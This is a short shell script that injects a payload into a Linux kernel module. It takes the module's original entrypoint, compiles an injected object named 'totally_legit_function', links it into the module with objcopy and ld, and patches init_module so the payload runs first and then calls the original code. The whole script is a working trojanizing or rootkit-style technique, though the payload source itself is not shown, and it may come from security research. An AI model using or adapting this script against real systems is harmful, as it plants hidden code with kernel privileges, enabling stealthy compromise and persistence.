#!/bin/sh
INPUT_MODULE=$1
OUTPUT_MODULE=$2

# fetch the entrypoint from the target module
SYMBOL_NAME=`./original.py $1` 

OUR_MAIN=totally_legit_function

# Compile our payload so it calls the target module.
# uses SYMBOL_NAME to call it.
OUR_MAIN=$OUR_MAIN SYMBOL_NAME=$SYMBOL_NAME make -C ./injection/

# We need to globalize the original entrypoint so we can call it.
objcopy --globalize-symbol=$SYMBOL_NAME $1 /tmp/step1.ko

# Link in our payload module.
ld -r /tmp/step1.ko \
    ./injection/src/injection.o \
    -o $OUTPUT_MODULE
rm /tmp/step1.ko

# Make init_module point to our new symbol
python3 ./patcher.py $OUR_MAIN $OUTPUT_MODULE $OUTPUT_MODULE
